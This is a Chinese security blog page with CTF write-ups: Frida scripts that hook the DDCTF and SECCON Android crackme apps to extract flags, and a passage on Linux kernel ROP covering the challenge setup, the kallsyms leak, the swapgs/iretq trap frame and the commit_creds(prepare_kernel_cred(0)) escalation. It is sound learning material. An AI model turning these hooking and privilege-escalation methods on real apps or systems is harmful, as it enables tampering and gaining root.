class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">var</span> hookClass = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">var</span> ClassUse = Java.use(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> objectclass= Java.use(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> dexclassLoader = Java.use(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> orininclass = Java.use(<span class="string">&quot;cn.chaitin.geektan.crackme.MainActivity&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Integerclass = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> mainAc = orininclass.$<span class="keyword">new</span>();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(<span class="string">&apos;java.lang.String&apos;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>{</span><br><span class="line">            <span class="keyword">var</span> hookname = <span class="string">&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.loadClass(name,<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span>(name == hookname){</span><br><span class="line">                <span class="keyword">var</span> hookClass = result;</span><br><span class="line">                <span class="keyword">var</span> hookClassCast = Java.cast(hookClass,ClassUse);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Constructor-------------------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> ConstructorParam =Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[objectclass.class]);</span><br><span class="line">                <span class="keyword">var</span> Constructor = hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Constructor:&quot;</span>+Constructor);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;orinin:&quot;</span>+mainAc);</span><br><span class="line">                <span class="keyword">var</span> instance = Constructor.newInstance([mainAc]);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;patchAc:&quot;</span>+instance);</span><br><span class="line">                send(instance);</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Methods----------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> func = hookClassCast.getDeclaredMethods();</span><br><span class="line">                <span class="built_in">console</span>.log(func);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------GET Joseph Function---------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(func[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">var</span> f = func[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">var</span> num1 = Integerclass.$<span class="keyword">new</span>(<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">var</span> num2 = Integerclass.$<span class="keyword">new</span>(<span class="number">6</span>);</span><br><span class="line">                <span class="keyword">var</span> numArr1 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num1,num2]);</span><br><span class="line">                <span class="keyword">var</span> num3 = Integerclass.$<span class="keyword">new</span>(<span class="number">7</span>);</span><br><span class="line">                <span class="keyword">var</span> num4 = Integerclass.$<span class="keyword">new</span>(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">var</span> numArr2 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num3,num4]);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Array------------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(numArr1);</span><br><span class="line">                <span class="built_in">console</span>.log(numArr2);</span><br><span class="line">                <span class="keyword">var</span> rtn1 = f.invoke(instance,numArr1);</span><br><span class="line">                <span class="keyword">var</span> rtn2 = f.invoke(instance,numArr2);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------------FLAG---------------------------------&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;DDCTF{&quot;</span>+rtn1+rtn2+<span class="string">&quot;}&quot;</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;--------------------------------OVER--------------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line"> </span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
<p>&#x7ECF;&#x6D4B;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5728;Genymotion&#x6A21;&#x62DF;&#x5668;&#x7684;android4.4&#x548C;androdi6.0&#x5747;&#x6D4B;&#x8BD5;&#x5931;&#x8D25;&#x2026;Hook&#x4E0D;&#x5230;loadClass&#x65B9;&#x6CD5;&#x3002;</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/06/frida使用/">frida-notebook</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-06</time><div class="content"><h2 id="1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;"><a href="#1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;" class="headerlink" title="1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;"></a>1&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;java&#x5C42;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) {</span><br><span class="line">    tv3.setText(<span class="string">&quot;SECCON{&quot;</span> + String.valueOf((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc()) * <span class="number">107</span>) + <span class="string">&quot;}&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>calc&#x4E3A;native&#x5C42;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;hook onCreate&#x65B9;&#x6CD5;&#xFF0C;&#x91CD;&#x65B0;&#x5B9E;&#x73B0;onCreate&#x65B9;&#x6CD5;&#xFF0C;&#x8C03;&#x7528;calc&#x65B9;&#x6CD5;&#xFF0C;&#x83B7;&#x5F97;&#x8FD4;&#x56DE;&#x503C;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java.Perform &#x5F00;&#x59CB;&#x6267;&#x884C;JavaScript&#x811A;&#x672C;&#x3002;</span></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> MainActivity = Java.use(<span class="string">&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;</span>);</span><br><span class="line">    MainActivity.onCreate.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="keyword">this</span>.calc();<span class="comment">//&#x8C03;&#x7528;MainActivity.calc()</span></span><br><span class="line">        send(<span class="string">&quot;Return:&quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">var</span> result = (<span class="number">1000</span>+returnValue)*<span class="number">107</span>;</span><br><span class="line">        send(<span class="string">&quot;Flag:&quot;</span>+<span class="string">&quot;SECCON{&quot;</span>+result.toString()+<span class="string">&quot;}&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
<h2 id="2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;"><a href="#2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;" class="headerlink" title="2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;"></a>2&#x3001;hook&#x51FD;&#x6570;&#xFF0C;&#x4FEE;&#x6539;java&#x5C42;&#x53D8;&#x91CF;&#x7684;&#x503C;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () {</span><br><span class="line">    var MainActivity = Java.use(<span class="string">&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;</span>);</span><br><span class="line">    <span class="comment">//hook onClick&#x65B9;&#x6CD5;&#xFF0C;&#x6B64;&#x5904;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;onClick&#x65B9;&#x6CD5;&#x662F;&#x4F20;&#x9012;&#x4E86;&#x4E00;&#x4E2A;View&#x53C2;&#x6570;v</span></span><br><span class="line">    MainActivity.onClick.implementation = function (v) {</span><br><span class="line">        <span class="comment">//&#x8C03;&#x7528;onClick,&#x6A21;&#x62DF;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;</span></span><br><span class="line">        <span class="keyword">this</span>.onClick(v);</span><br><span class="line">        <span class="keyword">this</span>.n.value = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.m.value = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">this</span>.cnt.value = <span class="number">999</span>;</span><br><span class="line">        send(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/04/Linux-Kernel-ROP/">Linux Kernel ROP</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-04</time><div class="content"><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x5185;&#x6838;&#x7A7A;&#x95F4;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5173;&#x4E8E;&#x5185;&#x6838;&#x6A21;&#x5757;&#x7684;&#x6F0F;&#x6D1E;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x5206;&#x6790;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x6253;&#x7B97;&#x53EA;&#x8BF4;&#x4E0B;&#x81EA;&#x5DF1;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x83B7;&#x5F97;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5728;&#x6B64;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
<h2 id="Load-CTF-Files-to-QEMU"><a href="#Load-CTF-Files-to-QEMU" class="headerlink" title="Load CTF Files to QEMU"></a>Load CTF Files to QEMU</h2><p>CTF files&#x5305;&#x542B;&#x4E86;4&#x4E2A;&#x6587;&#x4EF6;</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x251C;&#x2500;&#x2500; bzImage</span><br><span class="line">&#x251C;&#x2500;&#x2500; core.cpio</span><br><span class="line">&#x251C;&#x2500;&#x2500; start.sh</span><br><span class="line">&#x2514;&#x2500;&#x2500; vmlinux</span><br></pre></td></tr></table></figure>
<p>start.sh&#x662F;&#x7CFB;&#x7EDF;&#x7684;&#x542F;&#x52A8;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F00;&#x542F;&#x4E86;kaslr</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<ul>
<li>qemu-system-x86_64&#xFF1A;&#x6A21;&#x62DF;x86_64&#x67B6;&#x6784;</li>
<li>-m&#xFF1A;&#x6307;&#x5B9A;RAM&#x5927;&#x5C0F;</li>
<li>-kernel&#xFF1A;&#x52A0;&#x8F7D;&#x7684;&#x5185;&#x6838;&#x955C;&#x50CF;</li>
<li>-initrd&#xFF1A;&#x6307;&#x5B9A;&#x5185;&#x6838;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</li>
<li>-s&#xFF1A;&#x76F8;&#x5F53;&#x4E8E; -gdb tcp::1234&#xFF0C;&#x7ED1;&#x5B9A;&#x7AEF;&#x53E3;&#xFF0C;&#x4F7F;&#x7528;gdb&#x8C03;&#x8BD5;</li>
</ul>
<p>&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;vmlinux&#xFF0C;&#x8FD9;&#x91CC;&#x8BF4;&#x4E0B;vmlinux&#x548C;bzImage&#x7684;&#x5173;&#x7CFB;<a href="http://www.linfo.org/vmlinuz.html" target="_blank" rel="noopener">refference</a></p>
<blockquote>
<p>vmlinux&#x662F;&#x672A;&#x538B;&#x7F29;&#x7684;&#x3001;&#x9759;&#x6001;&#x94FE;&#x63A5;&#x7684;&#x3001;&#x53EF;&#x6267;&#x884C;&#x7684;&#x3001;&#x4F46;&#x662F;&#x4E0D;&#x80FD;bootable&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;<br>vmlinuz&#x662F;&#x7531;vmlinux&#x7ECF;&#x8FC7;&#x538B;&#x7F29;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;bootable&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;<code>zImage</code>&#x6216;bzImage<br>bzImage&#x662F;vmlinuz&#x7ECF;&#x8FC7;gzip&#x538B;&#x7F29;&#x540E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x5927;&#x5185;&#x6838;<br>zImage&#x662F;vmlinuz&#x7ECF;&#x8FC7;gzip&#x538B;&#x7F29;&#x540E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9002;&#x7528;&#x4E8E;<code>640k</code>&#x5185;&#x5B58;&#x7684;&#x5C0F;&#x5185;&#x6838;</p>
</blockquote>
<p>&#x4F46;&#x662F;&#x9898;&#x76EE;&#x63D0;&#x4F9B;&#x7684;vmlinux&#x548C;&#x5185;&#x6838;&#x4F7F;&#x7528;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x4ECE;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x63D0;&#x53D6;&#x6587;&#x4EF6;</p>
<h3 id="&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;"><a href="#&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;" class="headerlink" title="&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;"></a>&#x63D0;&#x53D6;cpio&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mv core.cpio core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br><span class="line"></span><br><span class="line">&#x251C;&#x2500;&#x2500; bin</span><br><span class="line">&#x251C;&#x2500;&#x2500; core.ko</span><br><span class="line">&#x251C;&#x2500;&#x2500; etc</span><br><span class="line">&#x251C;&#x2500;&#x2500; exploit</span><br><span class="line">&#x251C;&#x2500;&#x2500; gen_cpio.sh</span><br><span class="line">&#x251C;&#x2500;&#x2500; init</span><br><span class="line">&#x251C;&#x2500;&#x2500; lib</span><br><span class="line">&#x251C;&#x2500;&#x2500; lib64</span><br><span class="line">&#x251C;&#x2500;&#x2500; linuxrc -&gt; bin/busybox</span><br><span class="line">&#x251C;&#x2500;&#x2500; proc</span><br><span class="line">&#x251C;&#x2500;&#x2500; root</span><br><span class="line">&#x251C;&#x2500;&#x2500; sbin</span><br><span class="line">&#x251C;&#x2500;&#x2500; sys</span><br><span class="line">&#x251C;&#x2500;&#x2500; tmp</span><br><span class="line">&#x251C;&#x2500;&#x2500; usr</span><br><span class="line">&#x2514;&#x2500;&#x2500; vmlinux</span><br></pre></td></tr></table></figure>
<p>vmlinux&#x662F;&#x672A;&#x538B;&#x7F29;&#x7684;&#x5185;&#x6838;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x8FD9;&#x91CC;&#x627E;Gadgets<br>core.ko&#x5C31;&#x662F;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x5185;&#x6838;&#x6A21;&#x5757;<br>init&#x662F;&#x542F;&#x52A8;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment">#poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;sh end!\n&apos;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>poweroff -d 120 -f &amp; &#x8BBE;&#x7F6E;&#x4E86;&#x5B9A;&#x65F6;&#x5173;&#x673A;&#xFF0C;&#x5F71;&#x54CD;&#x8C03;&#x8BD5;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x91CA;&#x6389;<br><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code> &#x9650;&#x5236;&#x4E0D;&#x80FD;&#x4ECE; <code>/pro/kallsyms</code> &#x83B7;&#x53D6;&#x5185;&#x6838;&#x7B26;&#x53F7;&#x8868;&#x4FE1;&#x606F;</p>
<blockquote>
<p>/proc/kallsyms&#x5305;&#x542B;&#x4E86;kernel image&#x548C;&#x6240;&#x6709;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x7684;&#x7B26;&#x53F7;&#x8868;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x88AB;&#x7F16;&#x8BD1;&#x5668;&#x5185;&#x8054;&#xFF08;inline&#xFF09;&#x6216;&#x8005;&#x4F18;&#x5316;&#x6389;&#x4E86;&#xFF0C;&#x5219;&#x5B83;&#x5728;/proc/kallsyms&#x6709;&#x53EF;&#x80FD;&#x627E;&#x4E0D;&#x5230;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;root&#x7528;&#x6237;&#xFF0C;&#x5219;&#x663E;&#x793A;/proc/kallsyms&#x4E2D;&#x7684;&#x5730;&#x5740;&#x90FD;&#x662F;0&#xFF1A;</p>
</blockquote>
<p>&#x4F46;&#x662F;<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code> &#x8FD9;&#x53E5;&#xFF0C;&#x5C06;kallsyms&#x62F7;&#x8D1D;&#x4E86;&#x4E00;&#x4EFD;&#x5728;/tmp&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x67E5;&#x627E;commit_creds&#x548C;prepare_kernel_cred&#x7684;&#x5730;&#x5740;</p>
<h2 id="Privilege-Transfer"><a href="#Privilege-Transfer" class="headerlink" title="Privilege Transfer"></a>Privilege Transfer</h2><p>Since userspace and kernel space are in different memory segment with different permission, we need some instructions to switch the spaces.</p>
<p>To switch from userspace to kernel space, we need to use syscall. To switch back&#xFF0C;we need to use two instructions as blew.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">swapgs</span></span><br><span class="line"><span class="keyword">iretq</span></span><br></pre></td></tr></table></figure>
<p>The typical use of SWAPGS is to keep the &#x2018;user&#x2019; GS (which likely has a base address of 0) in the GSBase MSR, and the address of the kernel&#x2019;s per-CPU structure in KernelGSBase. Upon entry to Ring 0 (through a system call, software interrupt, or some other method), the kernel will use SWAPGS so accessing <code>[GS:0]</code> will get the pointer to the kernel data. Upon leaving Ring 0, SWAPGS will be called again, to switch GS back to the &#x2018;user&#x2019; GS. <a href="https://wiki.osdev.org/SWAPGS" target="_blank" rel="noopener">refference</a></p>
<p>Iretq instruction recovery the context of userspace, thus we come back from kernelspace to userspace. Before use this instruction,some value should be stored in the stack, and the stack construction as blew.</p>
<p>&#x5F53;&#x4F7F;&#x7528;IRET&#x6307;&#x4EE4;&#x8FD4;&#x56DE;&#x5230;&#x76F8;&#x540C;&#x4FDD;&#x62A4;&#x7EA7;&#x522B;&#x7684;&#x4EFB;&#x52A1;&#x65F6;&#xFF0C;IRET&#x4F1A;&#x4ECE;&#x6808;&#x5C06;<code>&#x8FD4;&#x56DE;&#x6307;&#x4EE4;&#x6307;&#x9488;</code>&#x3001;<code>&#x8FD4;&#x56DE;&#x4EE3;&#x7801;&#x6BB5;&#x9009;&#x62E9;&#x5668;</code>&#x4EE5;&#x53CA;<code>EFLAGS&#x6620;&#x50CF;</code>&#x5206;&#x522B;&#x5F39;&#x5165;RIP&#x3001;CS&#x4EE5;&#x53CA;RFLAGS&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x6062;&#x590D;&#x6267;&#x884C;&#x4E2D;&#x65AD;&#x7684;&#x7A0B;&#x5E8F;&#x6216;&#x8FC7;&#x7A0B;&#x3002;<br>&#x5F53;&#x4F7F;&#x7528;IRET&#x6307;&#x4EE4;&#x8FD4;&#x56DE;&#x5230;&#x4E0D;&#x540C;&#x4FDD;&#x62A4;&#x7EA7;&#x522B;&#x65F6;&#xFF0C;IRET&#x4E0D;&#x4EC5;&#x4F1A;&#x4ECE;&#x6808;&#x5F39;&#x51FA;&#x4EE5;&#x4E0A;&#x5185;&#x5BB9;&#xFF0C;&#x8FD8;&#x4F1A;&#x5F39;&#x51FA;<code>RSP</code>&#x4EE5;&#x53CA;<code>SS</code>&#x3002;</p>
<p>&#x6808;&#x4E0A;&#x4FDD;&#x5B58;&#x4E86;trap frame&#xFF0C;&#x8FD4;&#x56DE;&#x5230;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6062;&#x590D;&#x4FE1;&#x606F;&#x4ECE;&#x4EE5;&#x4E0B;&#x7ED3;&#x6784;&#x4E2D;&#x8BFB;&#x53D6;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> {</span></span><br><span class="line">    <span class="keyword">void</span> *rip;       <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint64_t</span> cs;     <span class="comment">// code segment +4</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rflags; <span class="comment">// CPU flags +8</span></span><br><span class="line">    <span class="keyword">void</span> *rsp;       <span class="comment">// stack pointer +12</span></span><br><span class="line">    <span class="keyword">uint64_t</span> ss;     <span class="comment">// stack segment +16</span></span><br><span class="line">} __attribute__((packed));</span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|---------|</span><br><span class="line">|iretq;ret| -&gt; the addr of the gadget  High</span><br><span class="line">|---------|</span><br><span class="line">|<span class="built_in"> RIP </span>    | -&gt; instruction address</span><br><span class="line">|---------|</span><br><span class="line">| CS      | -&gt; code segments</span><br><span class="line">|---------|</span><br><span class="line">| EFLAGS  | -&gt; flags <span class="keyword">for</span><span class="built_in"> system </span>status</span><br><span class="line">|---------|</span><br><span class="line">| RSP     | -&gt;<span class="built_in"> user </span>stack pointer</span><br><span class="line">|---------|</span><br><span class="line">| SS      | -&gt;<span class="built_in"> user </span>stack segment			Low</span><br><span class="line">|---------|</span><br></pre></td></tr></table></figure>
<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>getting privilege escalation via commit_creds(prepare_kernel_cred(0)<br>The above privilege escalation payload allocates a new credential struct (with uid = 0, gid = 0, etc.) and applies it to the <strong>calling process</strong>.</p>
